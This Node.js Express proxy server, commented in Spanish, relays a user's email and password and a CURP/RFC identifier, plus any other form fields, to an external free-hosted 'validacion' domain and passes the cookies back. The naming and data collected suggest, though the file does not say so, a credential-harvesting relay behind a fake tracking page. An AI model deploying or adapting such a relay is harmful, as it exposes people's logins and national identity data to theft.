const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.')); // Sirve el index.html

// ============================================
// PROXY PARA LOGIN
// ============================================
app.post('/api/login', async (req, res) => {
    try {
        const { email, password } = req.body;

        const formData = new FormData();
        formData.append('email', email);
        formData.append('password', password);

        const response = await fetch('https://validacion-4.byethost3.com/login/?i=1', {
            method: 'POST',
            body: formData,
            headers: {
                ...formData.getHeaders(),
                'Accept': 'application/json, text/html'
            },
            redirect: 'manual' // Para controlar redirecciones
        });

        // Obtener cookies de la respuesta
        const cookies = response.headers.get('set-cookie');
        const body = await response.text();

        res.json({
            status: response.status,
            ok: response.ok,
            cookies: cookies,
            body: body,
            url: response.url
        });

    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// PROXY PARA RASTREO (GET)
// ============================================
app.get('/api/rastreo', async (req, res) => {
    try {
        const cookieHeader = req.headers.cookie || '';

        const response = await fetch('https://validacion-4.byethost3.com/rastreo-seguro.php?i=1', {
            method: 'GET',
            headers: {
                'Cookie': cookieHeader,
                'Accept': 'text/html'
            }
        });

        const body = await response.text();
        const cookies = response.headers.get('set-cookie');

        res.json({
            status: response.status,
            ok: response.ok,
            cookies: cookies,
            body: body
        });

    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// PROXY PARA RASTREO (POST - enviar CURP/RFC)
// ============================================
app.post('/api/rastreo', async (req, res) => {
    try {
        const { curp_rfc, token, ...otrosCampos } = req.body;
        const cookieHeader = req.headers.cookie || '';

        const formData = new FormData();
        formData.append('curp_rfc', curp_rfc);
        if (token) formData.append('token', token);
        
        // Agregar otros campos ocultos
        for (const [key, value] of Object.entries(otrosCampos)) {
            formData.append(key, value);
        }

        const response = await fetch('https://validacion-4.byethost3.com/rastreo-seguro.php?i=1', {
            method: 'POST',
            body: formData,
            headers: {
                ...formData.getHeaders(),
                'Cookie': cookieHeader,
                'Accept': 'text/html'
            }
        });

        const body = await response.text();
        const cookies = response.headers.get('set-cookie');

        res.json({
            status: response.status,
            ok: response.ok,
            cookies: cookies,
            body: body
        });

    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// INICIAR SERVIDOR
// ============================================
app.listen(PORT, () => {
    console.log(`✅ Servidor proxy corriendo en http://localhost:${PORT}`);
    console.log(`📌 Frontend disponible en http://localhost:${PORT}`);
});
